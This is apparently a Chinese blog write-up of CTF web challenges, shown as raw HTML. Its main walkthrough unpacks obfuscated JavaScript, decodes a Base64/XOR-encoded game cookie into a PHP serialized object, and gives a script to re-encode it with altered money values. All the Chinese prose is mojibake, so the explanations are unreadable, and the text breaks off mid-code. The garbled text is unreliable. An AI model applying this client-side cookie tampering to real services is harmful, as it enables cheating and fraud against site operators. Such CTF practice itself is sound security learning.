alt="blog.png"></p><p>ä½†æ˜¯æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç½‘ä¸Šçš„wpï¼Œå‘ç°phpmyadminè¢«äººåˆ äº†ï¼Œæ‰€ä»¥æ²¡æ³•åš</p><h2 id="Trimçš„æ—¥è®°æœ¬"><a href="#Trimçš„æ—¥è®°æœ¬" class="headerlink" title="Trimçš„æ—¥è®°æœ¬"></a>Trimçš„æ—¥è®°æœ¬</h2><p>tips:ä¸è¦ä¸€æ¬¡å°±æ”¾å¼ƒ</p><p>æ˜¯ä¸ªç™»å½•é¡µé¢ï¼Œä½†æ˜¯æ²¡æœ‰è´¦å·ï¼Œæƒ³ç€å…ˆæ³¨å†Œä¸€ä¸ªï¼Œä½†æ˜¯å‘ç°æç¤ºæ•°æ®åº“è¿æ¥å¤±è´¥ï¼Œæ‰€ä»¥åº”è¯¥ä¸æ˜¯è¿™ä¸ªæ–¹æ³•</p><p>é‚£å°±ä¸‡äº‹ä¸è§‰æ‰«ä»¥ä¸‹</p><p>è¿˜çœŸæœ‰å‘ç°</p><p>æ‰«åˆ°ä¸‰ä¸ªç›®å½•</p><p>login.php</p><p>register.php</p><p>show.php</p><p>è®¿é—®show.php,æ‹¿åˆ°flag</p><p><img src="https://i.loli.net/2020/11/25/9JLhgS4HveW7Yyk.png" alt="trim.png"></p><h2 id="login2-SKCTF-login3-æ–‡ä»¶ä¸Šä¼ 2-login4"><a href="#login2-SKCTF-login3-æ–‡ä»¶ä¸Šä¼ 2-login4" class="headerlink" title="login2(SKCTF)  login3  æ–‡ä»¶ä¸Šä¼ 2  login4"></a>login2(SKCTF)  login3  æ–‡ä»¶ä¸Šä¼ 2  login4</h2><p>é¢˜ç›®éƒ½æŒ‚äº†</p><h2 id="æ±Ÿæ¹–é­”å¤´"><a href="#æ±Ÿæ¹–é­”å¤´" class="headerlink" title="æ±Ÿæ¹–é­”å¤´"></a>æ±Ÿæ¹–é­”å¤´</h2><p>æç¤º:å­¦ä¼šå¦‚æ¥ç¥æŒå°±å¯ä»¥æ‰“è´¥ä»–äº†å§</p><p>è¿›å…¥é¢˜ç›®å‘ç°è¿˜çœŸåƒæ˜¯æ¸¸æˆçš„ç•Œé¢</p><p>åŒ…å«å±æ€§ ç»ƒåŠŸ å•†åº— èµšé’± è®¨ä¼ é€€å‡º å‡ ä¸ªé¡µé¢</p><p><img src="https://i.loli.net/2020/11/25/YSI7zwLur5nCdca.png" alt="mt-1.png"></p><p>å…¶ä¸­ç»ƒåŠŸå¯ä»¥æé«˜è‡ªèº«å±æ€§ï¼Œä¹Ÿå°±æ˜¯æ­¦åŠ›å€¼ï¼Œèµšé’±æ¯æ¬¡åªèƒ½èµš100ï¼Œè€Œå•†åº—ä¸­æœ‰ä¸€äº›æé«˜æ­¦åŠ›å€¼çš„æ­¦å™¨ï¼Œå…¶ä¸­å°±æœ‰å¦‚æ¥ç¥æŒï¼Œä½†æ˜¯ä»·æ ¼ä¹Ÿé«˜çš„æƒŠäººï¼Œè‚¯å®šä¸æ˜¯é€šè¿‡èµšé’±çš„æ–¹æ³•æŒ£åˆ°é‚£ä¹ˆå¤šé’±ã€‚æ‰€ä»¥æ€è·¯å°±æ˜¯é€šè¿‡æ¼æ´ä¿®æ”¹é‡‘é’±æ•°é‡ä¹‹åè´­ä¹°å¦‚æ¥ç¥æŒï¼Œæ‰“è´¥é­”å¤´æ‹¿åˆ°flag</p><p><strong>æŸ¥çœ‹æºç </strong>    </p><p>åœ¨wulin.phpä¸­å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªjsæ–‡ä»¶</p><p><img src="https://i.loli.net/2020/11/25/Qkqr6FwmHVndU3s.png" alt="mt-2.png"></p><pre><code class="hljs js"><span class="hljs-comment">//script.js åœ¨çº¿æ ¼å¼åŒ–åçš„ç»“æœ</span><span class="hljs-built_in">eval</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">p, a, c, k, e, r</span>) </span>&#123;e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) </span>&#123;<span class="hljs-keyword">return</span> (c &lt; <span class="hljs-number">62</span> ? <span class="hljs-string">&#x27;&#x27;</span> : e(<span class="hljs-built_in">parseInt</span>(c / <span class="hljs-number">62</span>))) + ((c = c % <span class="hljs-number">62</span>) &gt; <span class="hljs-number">35</span> ? <span class="hljs-built_in">String</span>.fromCharCode(c + <span class="hljs-number">29</span>) : c.toString(<span class="hljs-number">36</span>))&#125;;<span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;0&#x27;</span>.replace(<span class="hljs-number">0</span>, e) == <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">while</span> (c--) r[e(c)] = k[c];k = [<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>&#123;<span class="hljs-keyword">return</span> r[e] || e&#125;];e = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;[57-9abd-hj-zAB]&#x27;</span>&#125;;c = <span class="hljs-number">1</span>&#125;;<span class="hljs-keyword">while</span> (c--)<span class="hljs-keyword">if</span> (k[c]) p = p.replace(<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">&#x27;\\b&#x27;</span> + e(c) + <span class="hljs-string">&#x27;\\b&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>), k[c]);<span class="hljs-keyword">return</span> p&#125;(<span class="hljs-string">&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\&#x27;;\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\&#x27;;\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\&#x27;&quot;\&#x27;,&quot;&quot;).B(\&#x27;&quot;\&#x27;,&quot;&quot;);9.write(\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;æµ£çŠ±å¨‡é¢ã„¥î›§é‰ãƒ§îš£éºå±¾å¢¦ç’ãƒ¤ç°¡é’‚æ¬’â‚¬ä¾€ç“Ÿé”›å±¼çµ¾æ¶“å¶‡ç…¡é–¬æ’´æ§¸éªç†»éŸ©æ©æ¨»æ§¸é‹å›ªéŸ©é”›å±¾å½æµœã‚ˆç˜¯æ¶“â‚¬æ¶“å¬ªæƒ‚!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">&#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;</span>.split(<span class="hljs-string">&#x27;|&#x27;</span>), <span class="hljs-number">0</span>, &#123;&#125;))</code></pre><p>å¯ä»¥çœ‹åˆ°<code>function(p, a, c, k, e, r)</code>å‡½æ•°æœ‰å…­ä¸ªå‚æ•°ï¼Œè€Œåé¢çš„ä¸€ä¸²å­—ç¬¦å¯ä»¥å‘ç°æ˜¯å¯¹åº”çš„å…­ä¸ªå®å‚ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ‰§è¡Œè¿™æ®µjsä»£ç ï¼Œçœ‹çœ‹ç»“æœæ˜¯ä»€ä¹ˆã€‚</p><pre><code class="hljs js">(<span class="hljs-string">&#x27;7 s(t)&#123;5 m=t+&quot;=&quot;;5 8=9.cookie.n(\&#x27;;\&#x27;);o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p&quot;&quot;&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=&quot;&quot;;o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=&quot;user&quot;;5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\&#x27;;\&#x27;);5 e=&quot;&quot;;o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(&quot;A&quot;))&#123;e=8[i+1].n(&quot;:&quot;)[2]&#125;&#125;e=e.B(\&#x27;&quot;\&#x27;,&quot;&quot;).B(\&#x27;&quot;\&#x27;,&quot;&quot;);9.write(\&#x27;&lt;img id=&quot;f-1&quot; g=&quot;h/1-1.k&quot;&gt;\&#x27;);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-2.k&quot;&#125;,1000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-3.k&quot;&#125;,2000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/1-4.k&quot;&#125;,3000);j(7()&#123;9.l(&quot;f-1&quot;).g=&quot;h/6.png&quot;&#125;,4000);j(7()&#123;alert(&quot;æµ£çŠ±å¨‡é¢ã„¥î›§é‰ãƒ§îš£éºå±¾å¢¦ç’ãƒ¤ç°¡é’‚æ¬’â‚¬ä¾€ç“Ÿé”›å±¼çµ¾æ¶“å¶‡ç…¡é–¬æ’´æ§¸éªç†»éŸ©æ©æ¨»æ§¸é‹å›ªéŸ©é”›å±¾å½æµœã‚ˆç˜¯æ¶“â‚¬æ¶“å¬ªæƒ‚!A&#123;&quot;+md5(e)+&quot;&#125;&quot;)&#125;,5000)&#125;&#x27;</span>, [], <span class="hljs-number">38</span>, <span class="hljs-string">&#x27;|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace&#x27;</span>.split(<span class="hljs-string">&#x27;|&#x27;</span>), <span class="hljs-number">0</span>, &#123;&#125;)</code></pre><p>åˆ é™¤evalåœ¨æµè§ˆå™¨çš„æ§åˆ¶å°è·‘å‡ºçš„ç»“æœ</p><p><img src="https://i.loli.net/2020/11/25/gPRY2r7G1LdtecT.png" alt="mt-4.png"></p><p>åœ¨çº¿ä»£ç æ ¼å¼åŒ–åå¦‚ä¸‹</p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCookie</span>(<span class="hljs-params">cname</span>) </span>&#123;    <span class="hljs-keyword">var</span> name = cname + <span class="hljs-string">&quot;=&quot;</span>;    <span class="hljs-keyword">var</span> ca = <span class="hljs-built_in">document</span>.cookie.split(<span class="hljs-string">&#x27;;&#x27;</span>);    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;        <span class="hljs-keyword">var</span> c = ca[i].trim();        <span class="hljs-keyword">if</span> (c.indexOf(name) == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> c.substring(name.length, c.length)    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode_create</span>(<span class="hljs-params">temp</span>) </span>&#123;    <span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();    <span class="hljs-keyword">var</span> result = base.decode(temp);    <span class="hljs-keyword">var</span> result3 = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; result.length; i++) &#123;        <span class="hljs-keyword">var</span> num = result[i].charCodeAt();        num = num ^ i;        num = num - ((i % <span class="hljs-number">10</span>) + <span class="hljs-number">2</span>);        result3 += <span class="hljs-built_in">String</span>.fromCharCode(num)    &#125;    <span class="hljs-keyword">return</span> result3&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ertqwe</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">var</span> temp_name = <span class="hljs-string">&quot;user&quot;</span>;    <span class="hljs-keyword">var</span> temp = getCookie(temp_name);    temp = <span class="hljs-built_in">decodeURIComponent</span>(temp);    <span class="hljs-keyword">var</span> mingwen = decode_create(temp);    <span class="hljs-keyword">var</span> ca = mingwen.split(<span class="hljs-string">&#x27;;&#x27;</span>);    <span class="hljs-keyword">var</span> key = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ca.length; i++) &#123;        <span class="hljs-keyword">if</span> (-<span class="hljs-number">1</span> &lt; ca[i].indexOf(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;            key = ca[i + <span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">2</span>]        &#125;    &#125;    key = key.replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>);    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;img id=&quot;attack-1&quot; src=&quot;image/1-1.jpg&quot;&gt;&#x27;</span>);    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/1-2.jpg&quot;</span>    &#125;, <span class="hljs-number">1000</span>);    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/1-3.jpg&quot;</span>    &#125;, <span class="hljs-number">2000</span>);    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/1-4.jpg&quot;</span>    &#125;, <span class="hljs-number">3000</span>);    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;attack-1&quot;</span>).src = <span class="hljs-string">&quot;image/6.png&quot;</span>    &#125;, <span class="hljs-number">4000</span>);    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        alert(<span class="hljs-string">&quot;æµ£çŠ±å¨‡é¢ã„¥î›§é‰ãƒ§îš£éºå±¾å¢¦ç’ãƒ¤ç°¡é’‚æ¬’â‚¬ä¾€ç“Ÿé”›å±¼çµ¾æ¶“å¶‡ç…¡é–¬æ’´æ§¸éªç†»éŸ©æ©æ¨»æ§¸é‹å›ªéŸ©é”›å±¾å½æµœã‚ˆç˜¯æ¶“â‚¬æ¶“å¬ªæƒ‚!flag&#123;&quot;</span> + md5(key) + <span class="hljs-string">&quot;&#125;&quot;</span>)    <span class="hljs-comment">//å‘ç°äº†flagå­—æ®µ  </span>    &#125;, <span class="hljs-number">5000</span>)&#125;</code></pre><p>é¦–å…ˆåœ¨æ§åˆ¶å°ä¸­è·å–cookie</p><pre><code class="hljs abnf">getCookie(<span class="hljs-string">&quot;user&quot;</span>)<span class="hljs-comment">;</span></code></pre><p><img src="https://i.loli.net/2020/11/25/YAdm9g1Z8R7MXIk.png" alt></p><p>è·å–cookieï¼Œä½¿ç”¨ä¸Šé¢çš„jsä»£ç ä¸€æ­¥ä¸€æ­¥è§£ç </p><p>æœ€åä¼šè·å–åºåˆ—åŒ–åçš„ä¸€ä¸²å­—ç¬¦ä¸²</p><p><img src="https://i.loli.net/2020/11/25/ceNDwnU2LAVkv5Z.png" alt="mt-5.png"></p><p>æœ€åè§£å‡ºæ¥çš„cookieå€¼</p><pre><code class="hljs css">O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;human&quot;</span>:<span class="hljs-number">10</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;xueliang&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">615</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;neili&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">657</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;lidao&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">76</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;dingli&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">72</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;waigong&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;neigong&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;jingyan&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;yelian&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;money&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;0&quot;</span>;&#125;</code></pre><p>ä½†æ˜¯ä¼šå‘ç°moneyçš„å€¼ä¸º0ï¼Œæ‰€ä»¥ä¸‹é¢çš„æ€è·¯å°±æ˜¯é€šè¿‡ä¿®æ”¹cookieä¸­moneyå€¼ä¹‹ååç¼–ç æˆé¢˜ç›®ä¸­çš„æ ¼å¼ï¼ŒæŠ“åŒ…ä¿®æ”¹cookieåä¹°æŠ€èƒ½æ‰“æ€ªæ‹¿åˆ°flag</p><p>æ”¹cookieçš„æ–¹æ³•å°±æ˜¯å°†æ˜æ–‡é€†å‘ç¼–ç ï¼š</p><p>åˆšå¼€å§‹å†™äº†æŒºä¹…çš„é€†å‘è§£å¯†ï¼Œå‘ç°è°ƒç”¨base64ä¸­çš„encodeæ—¶ï¼Œæ€ä¹ˆä¹Ÿè§£ä¸å‡ºåŸæ¥çš„åŠ å¯†ä»£ç ï¼Œencodeæ€ä¹ˆä¹ŸåŠ å¯†ä¸å‡ºåŸæ¥çš„cookieã€‚<br>çŒœæƒ³ä¸€å®šæ˜¯base64.jsæœ‰é—®é¢˜ï¼š</p><p>å‘ç°åŠ å¯†è¿‡ç¨‹å¹¶ä¸å¯¹åº”ï¼Œencodeè°ƒç”¨äº†_utf8_encode<br>ä½†decodeå¹¶æ²¡æœ‰è°ƒç”¨_utf8_encodeï¼Œæ‰€ä»¥éœ€è¦å¯¹ç¼–ç è¿‡ç¨‹è¿›è¡Œç›¸åº”çš„ä¿®æ”¹</p><p><img src="https://i.loli.net/2020/11/25/GWgjr69lpYb74cT.png" alt="mt-7.png"></p><p><strong>ä¿®æ”¹åçš„åç¼–ç è¿‡ç¨‹</strong>ï¼Œå°†å…¶æ”¾åˆ°htmlæ–‡ä»¶ä¸­ï¼Œæµè§ˆå™¨è¿è¡Œå³å¯å‡ºç»“æœ</p><pre><code class="hljs html">//1.html<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Base64</span>(<span class="hljs-params"></span>) </span>&#123;</span> <span class="javascript"><span class="hljs-comment">// private property</span></span><span class="javascript">_keyStr = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span> <span class="javascript"><span class="hljs-comment">// public method for encoding</span></span><span class="javascript"><span class="hljs-built_in">this</span>.encode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">input</span>) </span>&#123;</span><span class="javascript"><span class="hljs-keyword">var</span> output = <span class="hljs-string">&quot;&quot;</span>;</span><span class="javascript"><span class="hljs-keyword">var</span> chr1, chr2, chr3, enc1, enc2, enc3, enc4;</span><span class="javascript"><span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span><span class="javascript"><span class="hljs-comment">//input = _utf8_encode(input); (æ³¨é‡Šæ‰è¿™ä¸ªå‡½æ•°è°ƒç”¨)</span></span><span class="javascript"><span class="hljs-keyword">while</span> (i &lt; input.length) &#123;</span>chr1 = input.charCodeAt(i++);chr2 = input.charCodeAt(i++);chr3 = input.charCodeAt(i++);enc1 = chr1 &gt;&gt; 2;enc2 = ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4);enc3 = ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6);enc4 = chr3 &amp; 63;<span class="javascript"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr2)) &#123;</span>enc3 = enc4 = 64;<span class="javascript">&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(chr3)) &#123;</span>enc4 = 64;&#125;output = output +_keyStr.charAt(enc1) + _keyStr.charAt(enc2) +_keyStr.charAt(enc3) + _keyStr.charAt(enc4);&#125;<span class="javascript"><span class="hljs-keyword">return</span> output;</span>&#125; <span class="javascript"><span class="hljs-comment">// public method for decoding</span></span><span class="javascript"><span class="hljs-built_in">this</span>.decode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">input</span>) </span>&#123;</span><span class="javascript"><span class="hljs-keyword">var</span> output = <span class="hljs-string">&quot;&quot;</span>;</span><span class="javascript"><span class="hljs-keyword">var</span> chr1, chr2, chr3;</span><span class="javascript"><span class="hljs-keyword">var</span> enc1, enc2, enc3, enc4;</span><span class="javascript"><span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span><span class="javascript">input = input.replace(<span class="hljs-regexp">/[^A-Za-z0-9\+\/\=]/g</span>, <span class="hljs-string">&quot;&quot;</span>);</span><span class="javascript"><span class="hljs-keyword">while</span> (i &lt; input.length) &#123;</span>enc1 = _keyStr.indexOf(input.charAt(i++));enc2 = _keyStr.indexOf(input.charAt(i++));enc3 = _keyStr.indexOf(input.charAt(i++));enc4 = _keyStr.indexOf(input.charAt(i++));chr1 = (enc1 &lt;&lt; 2) | (enc2 &gt;&gt; 4);chr2 = ((enc2 &amp; 15) &lt;&lt; 4) | (enc3 &gt;&gt; 2);chr3 = ((enc3 &amp; 3) &lt;&lt; 6) | enc4;<span class="javascript">output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr1);</span>if (enc3 != 64) &#123;<span class="javascript">output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr2);</span>&#125;if (enc4 != 64) &#123;<span class="javascript">output = output + <span class="hljs-built_in">String</span>.fromCharCode(chr3);</span>&#125;&#125;<span class="javascript"><span class="hljs-comment">//output = _utf8_decode(output);</span></span><span class="javascript"><span class="hljs-keyword">return</span> output;</span>&#125; <span class="javascript"><span class="hljs-comment">// private method for UTF-8 encoding</span></span><span class="javascript">_utf8_encode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">string</span>) </span>&#123;</span><span class="javascript">string = string.replace(<span class="hljs-regexp">/\r\n/g</span>,<span class="hljs-string">&quot;\n&quot;</span>);</span><span class="javascript"><span class="hljs-keyword">var</span> utftext = <span class="hljs-string">&quot;&quot;</span>;</span><span class="javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> n = <span class="hljs-number">0</span>; n &lt; string.length; n++) &#123;</span><span class="javascript"><span class="hljs-keyword">var</span> c = string.charCodeAt(n);</span>if (c &lt; 128) &#123;<span class="javascript">utftext += <span class="hljs-built_in">String</span>.fromCharCode(c);</span><span class="javascript">&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">127</span>) &amp;&amp; (c &lt; <span class="hljs-number">2048</span>)) &#123;</span><span class="javascript">utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">6</span>) | <span class="hljs-number">192</span>);</span><span class="javascript">utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span><span class="javascript">&#125; <span class="hljs-keyword">else</span> &#123;</span><span class="javascript">utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &gt;&gt; <span class="hljs-number">12</span>) | <span class="hljs-number">224</span>);</span><span class="javascript">utftext += <span class="hljs-built_in">String</span>.fromCharCode(((c &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span><span class="javascript">utftext += <span class="hljs-built_in">String</span>.fromCharCode((c &amp; <span class="hljs-number">63</span>) | <span class="hljs-number">128</span>);</span>&#125; &#125;<span class="javascript"><span class="hljs-keyword">return</span> utftext;</span>&#125; <span class="javascript"><span class="hljs-comment">// private method for UTF-8 decoding</span></span><span class="javascript">_utf8_decode = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">utftext</span>) </span>&#123;</span><span class="javascript"><span class="hljs-keyword">var</span> string = <span class="hljs-string">&quot;&quot;</span>;</span><span class="javascript"><span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;</span><span class="javascript"><span class="hljs-keyword">var</span> c = c1 = c2 = <span class="hljs-number">0</span>;</span><span class="javascript"><span class="hljs-keyword">while</span> ( i &lt; utftext.length ) &#123;</span>c = utftext.charCodeAt(i);if (c &lt; 128) &#123;<span class="javascript">string += <span class="hljs-built_in">String</span>.fromCharCode(c);</span>i++;<span class="javascript">&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((c &gt; <span class="hljs-number">191</span>) &amp;&amp; (c &lt; <span class="hljs-number">224</span>)) &#123;</span>c2 = utftext.charCodeAt(i+1);<span class="javascript">string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">31</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c2 &amp; <span class="hljs-number">63</span>));</span>i += 2;<span class="javascript">&#125; <span class="hljs-keyword">else</span> &#123;</span>c2 = utftext.charCodeAt(i+1);c3 = utftext.charCodeAt(i+2);<span class="javascript">string += <span class="hljs-built_in">String</span>.fromCharCode(((c &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">12</span>) | ((c2 &amp; <span class="hljs-number">63</span>) &lt;&lt; <span class="hljs-number">6</span>) | (c3 &amp; <span class="hljs-number">63</span>));</span>i += 3;&#125;&#125;<span class="javascript"><span class="hljs-keyword">return</span> string;</span>&#125;&#125;<span class="javascript"><span class="hljs-comment">//åŸæ¥cookie</span></span><span class="javascript"><span class="hljs-keyword">var</span> temp = <span class="hljs-string">&quot;UTw7PCxqe3FjcC42OThOjWtSUFYwbm99amlzbG0wI3MeHBsUZ1liZxQMWEFDXl8EdUUOCgACd016B34WUlFWWTVoATEAAXF5P3Z2CmYgPTY5Pj90FSUUaGUfL2ZnYnYhCRMTGRQPQCcHKFIvEShXUlYCGQMbDQ4FXEcXREo/BTzBxKbu6fbrB+H+ps3nsLrP6dCs0LgR8fj1/+6y3+/apJ3XnJnkjNPf0NnRjpPD7pjzzfaMiJDcxt/XkP/B+I2C5vTqgUE=&quot;</span>;</span><span class="javascript"><span class="hljs-comment">//è¿›è¡ŒåŠ å¯†ï¼Œè·å–æ˜æ–‡</span></span><span class="javascript"><span class="hljs-keyword">var</span> base = <span class="hljs-keyword">new</span> Base64();</span><span class="javascript"><span class="hljs-keyword">var</span> result = base.decode(temp);</span><span class="javascript"><span class="hljs-keyword">var</span> result3 = <span class="hljs-string">&quot;&quot;</span>;</span>for (i = 0; i &lt; result.length; i++) &#123;<span class="javascript"><span class="hljs-keyword">var</span> num = result[i].charCodeAt();</span>num = num ^ i;num = num - ((i % 10) + 2);<span class="javascript">result3 += <span class="hljs-built_in">String</span>.fromCharCode(num);</span>&#125;    <span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&quot;åŸæ˜æ–‡ï¼š&quot;</span>+result3+<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);</span><span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>);</span><span class="javascript"><span class="hljs-keyword">var</span> result3 = <span 